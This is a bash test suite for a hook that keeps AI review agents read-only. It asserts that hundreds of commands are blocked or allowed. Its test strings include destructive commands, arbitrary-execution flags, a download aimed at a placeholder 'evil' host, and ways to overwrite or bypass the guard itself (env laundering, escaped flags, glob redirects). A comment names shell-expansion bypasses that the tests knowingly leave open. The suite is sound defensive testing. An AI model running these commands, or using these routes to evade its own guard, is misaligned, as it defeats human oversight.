#!/bin/bash
# Test suite for validate-readonly-bash.sh (the ship-lookout / ship-reviewer read-only hook).
# Usage: ./core/tests/test-readonly-bash.sh

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
HOOK="$SCRIPT_DIR/../hooks/validate-readonly-bash.sh"
PASS=0
FAIL=0

# jq is required — this suite builds the hook's stdin JSON with `jq -n`. Fail fast with a
# clear message instead of cascading per-case failures if jq is absent.
if ! command -v jq >/dev/null 2>&1; then
  echo "ERROR: jq is required to run this suite. Install jq (brew install jq / apt-get install jq) and re-run." >&2
  exit 2
fi

check() {
  local expected="$1" cmd="$2"
  local json result
  json=$(jq -n --arg cmd "$cmd" '{"tool_input":{"command":$cmd}}')
  if echo "$json" | bash "$HOOK" >/dev/null 2>&1; then
    result="ALLOW"
  else
    result="BLOCK"
  fi
  if [ "$result" = "$expected" ]; then
    PASS=$((PASS + 1))
  else
    printf "  FAIL: expected %-5s got %-5s  %s\n" "$expected" "$result" "$cmd"
    FAIL=$((FAIL + 1))
  fi
}

echo "=== Git read ops (ALLOW) ==="
check ALLOW 'git status'
check ALLOW 'git log --oneline -5'
check ALLOW 'git diff HEAD~1'
check ALLOW 'git show HEAD'
check ALLOW 'git branch -a'
check ALLOW 'git rev-parse HEAD'

echo "=== Git read ops via -C <path> (ALLOW — multi-repo ships, Finding D) ==="
check ALLOW 'git -C /path/to/repo status'
check ALLOW 'git -C ../other-repo log --oneline -5'
check ALLOW 'git -C /a/b diff HEAD~1'
check ALLOW 'git -C repo show HEAD'

echo "=== Git write ops (BLOCK) ==="
check BLOCK 'git commit -m "test"'
check BLOCK 'git push origin main'
check BLOCK 'git add .'
check BLOCK 'git reset --hard'
check BLOCK 'git merge feature'

echo "=== Git write ops via -C <path> (BLOCK — still hits default-deny) ==="
check BLOCK 'git -C /path/to/repo commit -m x'
check BLOCK 'git -C ../other push origin main'
check BLOCK 'git -C repo reset --hard'

echo "=== PR triage read tools (ALLOW) ==="
check ALLOW 'gh pr view 5'
check ALLOW 'gh pr diff 5'
check ALLOW 'gh pr checks 5'
check ALLOW 'pr-buddy list'
check ALLOW 'gh api /repos/o/r/pulls/5'

echo "=== Mutations blocked (BLOCK) ==="
check BLOCK 'gh pr comment 5 --body hi'
check BLOCK 'gh pr approve 5'
check BLOCK 'gh pr merge 5'
check BLOCK 'rm somefile'
check BLOCK 'cat queue.md'
check BLOCK 'curl -X POST https://example.com'

echo "=== File inspection / search (ALLOW) ==="
check ALLOW 'ls -la'
check ALLOW 'cat state/status.json'
check ALLOW 'grep -r foo docs/'
check ALLOW 'rg pattern'
check ALLOW 'curl https://example.com'

echo "=== FALSE POSITIVES FIXED: reviewer tokens as DATA (ALLOW — instance #3) ==="
# Quoted alternation pipes no longer fragment the segment
check ALLOW 'grep -E "(activate|send_test)" ui/server.ts'
check ALLOW "rg 'activate|send_test|x-mcp-action' -n ui/"
check ALLOW 'grep -rn "x-mcp-action" src/'
check ALLOW 'grep -E "dispatch|activate" -n lib/'
check ALLOW 'cat docs/dispatch-bands.md'
check ALLOW 'curl -s "http://localhost:3888/api?action=send_test"'
# Trigger tokens inside quoted args of data-arg commands are prose, not invocations
check ALLOW 'grep -n "git push" README.md'
check ALLOW 'echo "git commit is blocked for reviewers"'
check ALLOW 'grep "rm -rf" docs/runbook.md'
check ALLOW 'echo "a && b; c"'

echo "=== curl mutating attached/cluster/long forms (BLOCK) ==="
check BLOCK "curl -d'x=1' https://api.example.com"
check BLOCK 'curl -dx https://api.example.com'
check BLOCK 'curl -sd x https://api.example.com'
check BLOCK 'curl -sdx https://api.example.com'
check BLOCK 'curl --data=x https://api.example.com'
check BLOCK 'curl --data-binary @file https://api.example.com'
check BLOCK 'curl --data-urlencode "q=x" https://api.example.com'
check BLOCK 'curl --json "{}" https://api.example.com'
check BLOCK 'curl -K mutation.cfg https://api.example.com'
check BLOCK 'curl -sK mutation.cfg https://api.example.com'
check BLOCK 'curl --config mutation.cfg https://api.example.com'
check ALLOW 'curl -k https://self-signed.example.com'
check BLOCK 'curl -F field=@file https://api.example.com'
check BLOCK 'curl --form field=x https://api.example.com'
check BLOCK 'curl -T file.txt https://api.example.com'
check BLOCK 'curl --upload-file file.txt https://api.example.com'
check BLOCK 'curl -XPOST https://api.example.com'
check BLOCK 'curl -sXPOST https://api.example.com'
check BLOCK 'curl -sX POST https://api.example.com'
check BLOCK 'curl --request DELETE https://api.example.com'

echo "=== curl GET forms still ALLOW (no false positives) ==="
check ALLOW 'curl -I https://example.com'
check ALLOW 'curl -sL https://example.com'
check ALLOW 'curl -fsSL https://example.com'
check ALLOW 'curl -o out.json https://example.com'
check ALLOW 'curl -H "Accept: application/json" https://api.example.com'
check ALLOW 'curl -X GET https://api.example.com'
check ALLOW 'curl -D headers.txt https://example.com'

echo "=== find delete/exec/write actions (BLOCK) ==="
check BLOCK 'find . -name "*.txt" -delete'
check BLOCK 'find . -delete'
check BLOCK 'find . -type f -exec rm {} \;'
check BLOCK 'find . -exec cp {} /tmp \;'
check BLOCK 'find . -execdir rm {} \;'
check BLOCK 'find . -ok rm {} \;'
check BLOCK 'find . -fprint out.txt'
check BLOCK 'find . -fls out.txt'

echo "=== find read-only expressions still ALLOW ==="
check ALLOW 'find . -name "*.js"'
check ALLOW 'find . -type f -print'
check ALLOW 'find src -maxdepth 2 -name "*.py"'
check ALLOW 'find . -newer ref.txt'

echo "=== TRUE POSITIVES PRESERVED: compounds / wrappers / options (BLOCK) ==="
check BLOCK 'ls && git commit -m x'
check BLOCK 'echo ok; git push origin feat'
check BLOCK 'git -c user.name=x commit -m y'
check BLOCK 'git --git-dir=/x/.git push origin feat'
check BLOCK "bash -c 'git push origin main'"
check BLOCK 'sh -c "rm -rf /"'
check BLOCK 'FOO=1 git commit -m x'
check BLOCK 'env FOO=1 git push'
check BLOCK 'echo "$(git commit -m x)"'
check BLOCK 'echo `rm somefile`'
check BLOCK 'cat f | xargs rm'
check BLOCK 'ls; rm somefile'
check BLOCK 'gh pr view 5 && gh pr comment 5 --body hi'
check BLOCK 'gh pr edit 5 --add-label x'

echo "=== queue.md still blocked ANYWHERE, even quoted ==="
check BLOCK 'echo "queue.md"'
check BLOCK 'grep foo queue.md'

echo "=== W2 B1 class: pipes into interpreters netted by default-deny (BLOCK) ==="
# Readonly agents get no bare-interpreter whole-scan — interpreters simply are
# not on the allow-list, so the sink segment itself dies (verified here per the
# W2 review: default-deny is the net).
check BLOCK "echo 'git push origin main' | bash"
check BLOCK "echo 'rm -rf /' | sh"
check BLOCK 'printf "gh pr merge 5\n" | python3'

echo "=== W2 B2: backslash-newline continuations rejoin (BLOCK) ==="
check BLOCK 'git pu\
sh origin main'
check BLOCK 'cat que\
ue.md'
# Escaped backslash before newline is a REAL boundary, not a continuation
check ALLOW 'echo foo\\
git status'

echo "=== W2 N2: \$'...' ANSI-C quoting forces the raw scan (BLOCK) ==="
check BLOCK "git push origin \$'main'"

echo "=== W2 N3: zero-segment commands fail CLOSED (BLOCK) ==="
check BLOCK ';'
check BLOCK ' ; ; '

echo "=== W3: gh api mutation deny (N1 port — readonly allow-listed gh api unconditionally) ==="
check BLOCK 'gh api /repos/o/r/issues -X POST'
check BLOCK 'gh api /repos/o/r/issues --method POST'
check BLOCK 'gh api /repos/o/r/issues --method=POST'
check BLOCK 'gh api /repos/o/r/comments/1 --method DELETE'
check BLOCK 'gh api -XPATCH /repos/o/r/pulls/5'
check BLOCK 'gh api /repos/o/r/issues -f title=hi'
check BLOCK 'gh api /repos/o/r/issues -F body=@file'
check BLOCK 'gh api /repos/o/r/issues --field title=hi'
check BLOCK 'gh api /repos/o/r/issues --raw-field body=x'
check BLOCK 'gh api /repos/o/r/issues --input payload.json'
check BLOCK 'gh api graphql -f query="mutation { x }"'
check BLOCK 'gh pr view 5 && gh api /repos/o/r/pulls/5/reviews -X POST'
# Reads (incl. explicit GET) stay allowed
check ALLOW 'gh api /repos/o/r/pulls/5'
check ALLOW 'gh api --method GET /repos/o/r/pulls/5'
check ALLOW 'gh api -X GET /repos/o/r/pulls/5'
check ALLOW 'gh api --paginate /repos/o/r/pulls'
check ALLOW 'gh pr view 5'

echo "=== W4: gh api pflag ATTACHED shorthand (-ftitle=... was a live bypass) ==="
check BLOCK 'gh api /repos/o/r/issues -ftitle=hello'
check BLOCK 'gh api /repos/o/r/issues -Fbody=@payload'
check BLOCK 'gh api graphql -fquery=mutation{m}'
check BLOCK 'gh api -ftitle=x /repos/o/r/issues'
check BLOCK 'gh api /repos/o/r/issues -f'
# pflag combined clusters: -i (--include) is gh api's ONLY boolean shorthand, so
# -i-prefixed clusters reach -f/-F/-X (verified live: gh 2.79.0 parses -iftitle=x
# as --include --raw-field title=x, -iXPOST as --include --method POST)
check BLOCK 'gh api /repos/o/r/issues -iftitle=pwn'
check BLOCK 'gh api /repos/o/r/issues -iFbody=@payload'
check BLOCK 'gh api /repos/o/r/issues -iiftitle=x'
check BLOCK 'gh api /repos/o/r/issues -if title=x'
check BLOCK 'gh api /repos/o/r/issues -if=title=x'
check BLOCK 'gh api -iXPOST /repos/o/r/issues'
check BLOCK 'gh api -iX POST /repos/o/r/issues'
# Reads stay allowed: bare -i, cluster ending in GET, non-gh -f usage
check ALLOW 'gh api /repos/o/r/pulls --method GET'
check ALLOW 'gh api -i /repos/o/r/pulls/5'
check ALLOW 'gh api -iX GET /repos/o/r/pulls'
check ALLOW 'gh pr view 12'
check ALLOW 'grep -f patterns file'

echo "=== DECLINED test-runner: interpreters default-deny (read-only agents execute nothing) ==="
# The v2 ro_test_runner_allowed lane is declined (see DECISIONS.md) — interpreters
# are NOT on the allow-list, so every interpreter form (script-path or not) BLOCKs.
check BLOCK 'python3 tests/test_x.py'
check BLOCK 'python3 core/tests/test_shipkit_init.py'
check BLOCK 'python3 ./tests/test_x.py'
check BLOCK 'bash test-foo.sh'
check BLOCK 'bash core/tests/test-crew-bash.sh'
check BLOCK "python3 -c 'print(1)'"
check BLOCK 'python3 -m pytest'
check BLOCK 'python3'
check BLOCK 'bash -c "git push"'
check BLOCK 'ruby run.rb'
check BLOCK 'node script.js'
check BLOCK 'echo "import os" | python3'

echo "=== Fable HIGH-1: env launders execution past the read-only gate (BLOCK) ==="
check BLOCK 'env python3 tests/test_x.py'
check BLOCK 'env sh -c id'
check BLOCK 'env rm somefile'
check BLOCK 'env FOO=1 python3 x.py'
check BLOCK 'env'
# printenv covers the read use of the environment
check ALLOW 'printenv PATH'
check ALLOW 'printenv'

echo "=== Fable HIGH-2: git repo-state writes denied (was allow-listed with no deny) (BLOCK) ==="
check BLOCK 'git branch -D main'
check BLOCK 'git branch --delete feature'
check BLOCK 'git branch -m old new'
check BLOCK 'git tag v1.0.0'
check BLOCK 'git tag -a v1 -m release'
check BLOCK 'git tag -d v1'
check BLOCK 'git checkout main'
check BLOCK 'git checkout -- .'
check BLOCK 'git checkout -b feature'
check BLOCK 'git switch main'
check BLOCK 'git switch -c feature'
check BLOCK 'git remote add upstream https://example.com/x.git'
check BLOCK 'git remote set-url origin git@example.com:x.git'
check BLOCK 'git remote remove origin'
echo "=== git list/inspect + read still ALLOW (do-not-regress) ==="
check ALLOW 'git branch'
check ALLOW 'git branch -a'
check ALLOW 'git tag -l'
check ALLOW 'git tag --list v*'
check ALLOW 'git tag -n5'
check ALLOW 'git tag --points-at HEAD'
check ALLOW 'git remote'
check ALLOW 'git remote -v'
check ALLOW 'git -C /repo tag -l'
check ALLOW 'git status'
check ALLOW 'git log --oneline -5'
# checkout/switch tokens as DATA must NOT false-block
check ALLOW 'grep -rn "git checkout" docs/'
check ALLOW 'echo "use git switch to change branches"'

echo "=== Fable HIGH-3/MED-1 + re-review HIGH-B/LOW: reader tools with arbitrary-exec flags (BLOCK) ==="
check BLOCK 'fd . -x rm {}'
check BLOCK 'fd . -X sh -c id'
check BLOCK 'fd pattern --exec rm'
check BLOCK 'fd pattern --exec-batch rm'
check BLOCK 'rg --pre /bin/sh pat .'
check BLOCK 'rg --pager /bin/sh pattern .'
check BLOCK 'rg --hostname-bin /bin/sh pat .'
check BLOCK 'ag --pager /bin/sh x'
check BLOCK 'sort --compress-program /bin/sh file'
# tar is removed from the allow-list entirely (its exec surface — -I/--use-compress-program/
# --checkpoint-action=exec=/--to-command — is bounded but real): every tar form default-denies.
check BLOCK 'tar -I /bin/sh -tf x.tar'
check BLOCK 'tar --use-compress-program /bin/sh -tf x.tar'
check BLOCK 'tar -t -f archive.tar --checkpoint=1 --checkpoint-action=exec=id'
check BLOCK 'tar -t -f archive.tar'
check BLOCK 'tar --list -f archive.tar'
echo "=== plain search / listing still ALLOW (do-not-regress); --pretty not a false-block (MED-A) ==="
check ALLOW 'fd . -e js'
check ALLOW 'fd pattern src/'
check ALLOW 'rg pattern src/'
check ALLOW 'rg -n foo lib/'
check ALLOW 'rg --pretty foo src/'
check ALLOW 'ag pattern'
check ALLOW 'sort file.txt'
check ALLOW 'sort -u -n data.txt'
check ALLOW 'unzip -l archive.zip'
check ALLOW 'zipinfo archive.zip'
# exec-flag tokens as DATA in a transparent reader must NOT false-block (command-anchored denies)
check ALLOW 'grep -rn "fd -x" docs/'
check ALLOW 'grep -n "rg --pre" notes.md'

echo "=== Fable re-review HIGH-A: backslash/quote-escaped flags dodge the deny (BLOCK) ==="
# The shell runs \-D / '-D' / \--pre as real flags; the deny-side copy must normalize them.
check BLOCK 'git branch \-D main'
check BLOCK "git branch '-D' main"
check BLOCK 'git tag \-d v1'
check BLOCK 'find . \-delete'
check BLOCK "find . '-delete'"
check BLOCK 'fd . \-x rm {}'
check BLOCK "fd . '-x' rm {}"
check BLOCK "rg '--pre' /bin/sh pat ."
check BLOCK 'rg \--pre /bin/sh pat .'
check BLOCK 'rm \-rf x'
# HIGH-2: curl mutating flags backslash-escaped (curl deny has its own local strip)
check BLOCK 'curl \-d x=1 https://api.example.com/thing'
check BLOCK 'curl \-X POST https://api.example.com'
check BLOCK 'curl \-F field=@f https://api.example.com'
# escaped tokens as DATA still don't false-block (allow-list sees the original)
check ALLOW 'grep -rn "git branch" docs/'
# NB: flags produced by SHELL EXPANSION ($'\x2dD', ${x:--D}, $(printf -- -D), $FLAG) are the
# 043-deferred deliberate-evasion residual (see guard header) — NOT asserted here, since a
# text matcher cannot see a post-expansion `-`; codifying them would assert a known bypass.

echo "=== Fable re-review MED-B (accepted residual): git branch <name> creates a local ref (ALLOW) ==="
check ALLOW 'git branch newfeature'
check ALLOW 'git branch --show-current'

# ============================================================
# 058 (B) SUBSTRATE SELF-PROTECTION — ported to the readonly guard (readonly slice).
# The headline read-only vector is a REDIRECT from an allowed reader onto a guard
# (`cat innocuous > <guard>` — cat is allowed, `>` writes). Plus the reader-inversion:
# a non-reader verb on a substrate path, and writers laundered through the engine.
# ============================================================

echo "=== (B) headline vector: redirect from a reader onto a substrate file (BLOCK) ==="
check BLOCK 'cat /etc/hosts > core/hooks/validate-readonly-bash.sh'
check BLOCK 'cat /dev/null > core/hooks/validate-crew-bash.sh'
check BLOCK 'grep -v x /tmp/a > core/hooks/crew-allow-local.sh'
check BLOCK 'cat evil >> ~/.claude/hooks/ship-substrate-guard.sh'
check BLOCK 'echo x > "core/hooks/validate-readonly-bash.sh"'
check BLOCK 'cat /tmp/x > agents/ship-crew.md'
# reader → concrete NON-substrate target still passes (do-not-regress)
check ALLOW 'cat core/hooks/validate-readonly-bash.sh > /tmp/backup.txt'
check ALLOW 'echo "notes" > /tmp/scratch.txt'

echo "=== (B) reader set: reads of substrate files ALLOW ==="
check ALLOW 'cat core/hooks/validate-readonly-bash.sh'
check ALLOW 'head -20 core/hooks/validate-crew-bash.sh'
check ALLOW 'grep -n exit core/hooks/validate-crew-bash.sh'
check ALLOW 'wc -l core/hooks/validate-readonly-bash.sh'
check ALLOW 'diff core/hooks/validate-crew-bash.sh /tmp/other'
check ALLOW 'ls -la core/hooks'
check ALLOW 'stat core/agents/ship-crew.md'
check ALLOW 'shasum core/hooks/validate-readonly-bash.sh'
check ALLOW 'cmp core/hooks/validate-crew-bash.sh /tmp/deployed.sh'
check ALLOW 'nl core/hooks/validate-crew-bash.sh'
check ALLOW 'egrep -n exit core/hooks/validate-crew-bash.sh'
check ALLOW 'od -An -c core/hooks/ship-substrate-guard.sh'
check ALLOW 'cat core/hooks/validate-crew-bash.sh | grep foo | wc -l'

echo "=== (B) reader inversion: non-reader verb on a substrate path DENY (round-1 minimal set) ==="
check BLOCK 'echo core/hooks/validate-crew-bash.sh'
check BLOCK 'printf %s core/hooks/validate-readonly-bash.sh'
check BLOCK 'cat core/hooks/validate-crew-bash.sh && date'
# git READ subcommands ARE reader-equivalent; mutating / --output forms are not
check ALLOW 'git diff core/hooks/validate-crew-bash.sh'
check ALLOW 'git show HEAD:core/hooks/validate-crew-bash.sh'
check ALLOW 'git log --oneline core/hooks/validate-crew-bash.sh'
check BLOCK 'git diff --output=core/hooks/validate-crew-bash.sh'

echo "=== (B) writers laundered through the engine on substrate (BLOCK) ==="
check BLOCK 'echo $(rm core/hooks/validate-crew-bash.sh)'
check BLOCK 'A=$(rm core/hooks/validate-readonly-bash.sh)'
check BLOCK 'echo core/hooks/validate-crew-bash.sh | xargs rm'
check BLOCK 'cat <(rm core/hooks/validate-crew-bash.sh)'
check BLOCK 'cat =(rm core/hooks/crew-allow-local.sh)'
check BLOCK 'cat $(cat /etc/hosts > core/hooks/validate-readonly-bash.sh)'
# reader via xargs on a substrate path still ALLOW
check ALLOW 'cat core/hooks/validate-crew-bash.sh | xargs -n1 grep foo'

echo "=== (B) case-insensitive + backslash + path-norm arming (BLOCK) ==="
check BLOCK 'cat /dev/null > Core/Hooks/Validate-Readonly-Bash.SH'
check BLOCK 'cat /etc/hosts > core/hooks/validate-readonly-bash\.sh'
check BLOCK 'cat /etc/hosts > core//hooks/validate-readonly-bash.sh'
check BLOCK 'cat /etc/hosts > core/./hooks/validate-crew-bash.sh'

echo "=== (B) glob / \${VAR} / substitution redirect target onto substrate (BLOCK) ==="
check BLOCK 'cat /etc/hosts > core/hooks/*.sh'
check BLOCK 'cat /etc/hosts > core/hooks/validate-readonly-b*.sh'
check BLOCK 'cat /etc/hosts > core/hooks/validate-crew-bas${X}.sh'
check BLOCK 'cat /etc/hosts > ~/.claude/hooks/validate-crew-b*.sh'
check BLOCK 'echo x > `ls -d core/hooks`/validate-crew-bash.sh'
check BLOCK 'cat /dev/null > core/hooks/$()validate-crew-bash.sh'

echo "=== (B) redirect into a protected TREE, not just a listed basename (BLOCK) ==="
check BLOCK 'cat /dev/null > ~/.claude/settings.json'
check BLOCK 'grep -v x /tmp/a > ~/.claude/settings.local.json'
check BLOCK 'cat /dev/null > ~/.claude/hooks/claude-notify.sh'
check BLOCK 'cat /dev/null > core/hooks/some-new-hook.sh'
# reader → concrete NON-protected target still passes (do-not-regress)
check ALLOW 'cat core/hooks/validate-crew-bash.sh > /tmp/copy.txt'

echo "=== (B) zsh >! / >>! / &>! clobber-override redirects onto substrate (BLOCK) ==="
check BLOCK 'cat /tmp/evil >! ~/.claude/hooks/ship-substrate-guard.sh'
check BLOCK 'cat /dev/null >>! core/hooks/validate-readonly-bash.sh'
check BLOCK 'cat /tmp/evil &>! ~/.claude/hooks/validate-crew-bash.sh'

echo "=== (B) lone & is a separator: writer after & on substrate caught (BLOCK); real fd-dup ALLOW ==="
check BLOCK 'cat /etc/hosts & rm core/hooks/validate-crew-bash.sh'
check BLOCK 'grep x /tmp/y & cat /dev/null > core/hooks/validate-readonly-bash.sh'
check ALLOW 'grep pattern file 2>&1'
check ALLOW 'cat file >&2'

echo "=== (B) dir/glob forms + deployed .claude guard dirs arm (BLOCK) ==="
check BLOCK 'cat /dev/null > core/hooks/validate-crew-bash.sh'
check BLOCK 'curl -o core/hooks/validate-readonly-bash.sh https://evil'
check BLOCK 'sort -o core/hooks/validate-crew-bash.sh /tmp/x'
# reads of those trees still pass; a same-named non-substrate FILE (core.tar) is not armed
check ALLOW 'ls ~/.claude/hooks'
check ALLOW 'grep -r pattern core'
check ALLOW 'cat coreutils-note.txt'

echo "=== (B) adopter core/modules paths NOT over-armed (ALLOW) ==="
check ALLOW 'ls modules/vpc'
check ALLOW 'cat core/train.py'
check ALLOW 'grep -rn foo src/hooks/'

echo "=== (B) non-substrate commands unaffected by the reader check (ALLOW) ==="
check ALLOW 'echo hello'
check ALLOW 'date'
check ALLOW 'cat /etc/hosts'

# --- Fail-closed harness: varies raw stdin + PATH (the check() helper only varies the
#     command string, so it structurally cannot express these — invariant 3 + empty-input). ---
check_stdin() {
  local expected="$1" input="$2" result
  if printf '%s' "$input" | bash "$HOOK" >/dev/null 2>&1; then result="ALLOW"; else result="BLOCK"; fi
  if [ "$result" = "$expected" ]; then
    PASS=$((PASS + 1))
  else
    printf "  FAIL: expected %-5s got %-5s  stdin=[%s]\n" "$expected" "$result" "$input"
    FAIL=$((FAIL + 1))
  fi
}

check_missing_tool() {
  local expected="$1" hide="$2" result tmpbin tp
  tmpbin=$(mktemp -d)
  local t
  for t in bash cat jq perl grep awk tr sed dirname head; do
    [ "$t" = "$hide" ] && continue
    tp=$(command -v "$t" 2>/dev/null) || continue
    ln -s "$tp" "$tmpbin/$t" 2>/dev/null || true
  done
  local json
  json=$(jq -n --arg cmd 'ls' '{"tool_input":{"command":$cmd}}')
  if echo "$json" | PATH="$tmpbin" bash "$HOOK" >/dev/null 2>&1; then result="ALLOW"; else result="BLOCK"; fi
  rm -rf "$tmpbin"
  if [ "$result" = "$expected" ]; then
    PASS=$((PASS + 1))
  else
    printf "  FAIL: expected %-5s got %-5s  (missing %s)\n" "$expected" "$result" "$hide"
    FAIL=$((FAIL + 1))
  fi
}

echo "=== fail-closed on empty/malformed stdin + missing tooling (BLOCK) ==="
check_stdin BLOCK ''
check_stdin BLOCK 'not json at all'
check_stdin ALLOW '{"tool_input":{"command":"ls"}}'
check_stdin ALLOW '{"tool_input":{}}'
check_missing_tool BLOCK jq
check_missing_tool BLOCK perl

# --- A5 / A3 arming-depth (Nav ruling 2026-07-30) ---
# check_cwd: pass a session .cwd in the payload (the harness default omits it).
check_cwd() {  # $1=expected $2=cwd $3=cmd
  local expected="$1" cwd="$2" cmd="$3" json result
  json=$(jq -n --arg cmd "$cmd" --arg cwd "$cwd" '{"tool_input":{"command":$cmd},"cwd":$cwd}')
  if echo "$json" | bash "$HOOK" >/dev/null 2>&1; then result="ALLOW"; else result="BLOCK"; fi
  if [ "$result" = "$expected" ]; then PASS=$((PASS + 1)); else
    printf "  FAIL: expected %-5s got %-5s  (cwd=%s) %s\n" "$expected" "$result" "$cwd" "$cmd"; FAIL=$((FAIL + 1)); fi
}
# check_offlayout: invoke an OFF-LAYOUT copy of the guard (a `scripts/` install like the live
# ship) so the hard-coded `core/hooks` DIR literal cannot match — a BLOCK on a dir reference with
# NO protected basename proves arming derives from the hook's own resolved dir (A5). {DIR} → guard dir.
check_offlayout() {  # $1=expected $2=cmd-template
  local expected="$1" tmpl="$2" base d cmd json result
  base=$(mktemp -d); d="$base/scripts"; mkdir -p "$d"; cp "$HOOK" "$d/validate-readonly-bash.sh"
  cmd=${tmpl//\{DIR\}/$d}
  json=$(jq -n --arg cmd "$cmd" '{"tool_input":{"command":$cmd}}')
  if echo "$json" | bash "$d/validate-readonly-bash.sh" >/dev/null 2>&1; then result="ALLOW"; else result="BLOCK"; fi
  rm -rf "$base"
  if [ "$result" = "$expected" ]; then PASS=$((PASS + 1)); else
    printf "  FAIL: expected %-5s got %-5s  (off-layout) %s\n" "$expected" "$result" "$cmd"; FAIL=$((FAIL + 1)); fi
}

echo "=== A5 (Nav ruling): arming derives from the hook's own dir, not a core/hooks literal (off-layout) ==="
# A non-reader verb naming the self-dir arms the reader-inversion; a reader redirecting to a
# GLOB target in the self-dir arms deny (c). Both prove arming derives from the resolved dir.
check_offlayout BLOCK 'echo pwned > {DIR}/z'        # non-reader verb into the guard dir -> A5-only arm (reader-inversion)
check_offlayout BLOCK 'cat /dev/null > {DIR}/*.sh'  # reader + glob redirect target in the guard dir -> A5-only arm (deny c)
check_offlayout ALLOW 'ls {DIR}'                    # reader on the guard dir -> armed but allowed
check_offlayout ALLOW 'cat {DIR}-backup/x.txt'      # sibling dir sharing the prefix -> NOT over-armed

echo "=== A3 (Nav ruling, bounded): session cwd inside the guard dir arms a bare glob redirect ==="
HOOKDIR="$(cd "$(dirname "$HOOK")" && pwd)"
check_cwd BLOCK "$HOOKDIR" 'cat /dev/null > *.sh'      # reader + bare glob redirect target, cwd IS the guard dir -> deny (c)
check_cwd BLOCK "$HOOKDIR" 'echo pwned > out'         # non-reader verb from inside the guard dir -> reader-inversion
check_cwd ALLOW "$HOOKDIR" 'cat foo.sh'               # reader from inside guard dir -> armed but allowed
check_cwd ALLOW "$HOME/code/drip" 'cat /dev/null > *.o'   # normal repo cwd -> NOT armed (glob redirect fine)
check_cwd ALLOW "$HOOKDIR-other" 'cat /dev/null > *.sh'   # sibling cwd sharing the prefix -> NOT contained

echo
echo "Passed: $PASS  Failed: $FAIL"
[ "$FAIL" -eq 0 ] && echo "All readonly-bash tests passed." || { echo "FAILURES."; exit 1; }
